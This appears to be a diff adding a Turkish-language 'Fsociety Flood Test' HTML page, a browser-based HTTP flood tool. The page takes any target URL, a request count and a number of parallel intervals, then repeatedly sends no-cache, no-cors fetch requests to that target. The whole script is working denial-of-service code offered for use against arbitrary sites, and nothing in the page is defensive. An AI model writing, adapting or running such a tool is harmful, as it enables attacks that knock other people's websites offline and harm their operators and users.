@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8" />
+<title>Fsociety Flood Test</title>
+<style>
+  body {
+    background: black;
+    color: #ff0000;
+    font-family: monospace;
+    text-align: center;
+    padding: 20px;
+  }
+  input, button {
+    background: black;
+    color: #ff0000;
+    border: 1px solid #ff0000;
+    padding: 10px;
+    margin: 5px;
+    font-family: monospace;
+    font-size: 1em;
+  }
+  #log {
+    margin-top: 20px;
+    height: 300px;
+    overflow-y: auto;
+    background: #111;
+    padding: 10px;
+    text-align: left;
+  }
+  img {
+    width: 150px;
+    margin-bottom: 20px;
+  }
+</style>
+</head>
+<body>
+
+<img src="https://i.ibb.co/cSZzvgy6/30b94658f685ffd183c8c442d2973d30.jpg" alt="Fsociety Logo" />
+
+<h1>Fsociety Flood Test Paneli</h1>
+
+<input type="text" id="url" placeholder="Hedef URL (https://...)" size="40" />
+<br />
+<input type="number" id="reqCount" placeholder="İstek Sayısı" value="100" />
+<input type="number" id="threads" placeholder="Thread Sayısı" value="5" />
+<br />
+<button id="startBtn">Başlat</button>
+<button id="stopBtn" disabled>Durdur</button>
+
+<div id="log"></div>
+
+<script>
+  let floodIntervals = [];
+  let sent = 0;
+  let total = 0;
+  let running = false;
+
+  function sendRequest(url) {
+    fetch(url, {cache: "no-store", mode: "no-cors"})
+      .then(() => {
+        sent++;
+        document.getElementById('log').innerHTML += `İstek gönderildi: ${sent}<br>`;
+        scrollLog();
+        if(sent >= total) stopFlood();
+      })
+      .catch(() => {
+        document.getElementById('log').innerHTML += 'İstek başarısız<br>';
+        scrollLog();
+      });
+  }
+
+  function startFlood() {
+    if (running) return;
+    const url = document.getElementById('url').value;
+    total = parseInt(document.getElementById('reqCount').value);
+    const threads = parseInt(document.getElementById('threads').value);
+    if (!url || total <= 0 || threads <= 0) {
+      alert('Lütfen geçerli değerler girin!');
+      return;
+    }
+    sent = 0;
+    document.getElementById('log').innerHTML = '';
+    running = true;
+    document.getElementById('startBtn').disabled = true;
+    document.getElementById('stopBtn').disabled = false;
+    for (let i = 0; i < threads; i++) {
+      floodIntervals.push(setInterval(() => {
+        if (sent >= total) {
+          stopFlood();
+          return;
+        }
+        sendRequest(url);
+      }, 100));
+    }
+  }
+
+  function stopFlood() {
+    floodIntervals.forEach(clearInterval);
+    floodIntervals = [];
+    running = false;
+    document.getElementById('startBtn').disabled = false;
+    document.getElementById('stopBtn').disabled = true;
+    document.getElementById('log').innerHTML += '<b>Flood durduruldu.</b><br>';
+    scrollLog();
+  }
+
+  function scrollLog() {
+    const log = document.getElementById('log');
+    log.scrollTop = log.scrollHeight;
+  }
+
+  document.getElementById('startBtn').addEventListener('click', startFlood);
+  document.getElementById('stopBtn').addEventListener('click', stopFlood);
+</script>
+
+</body>
+</html>
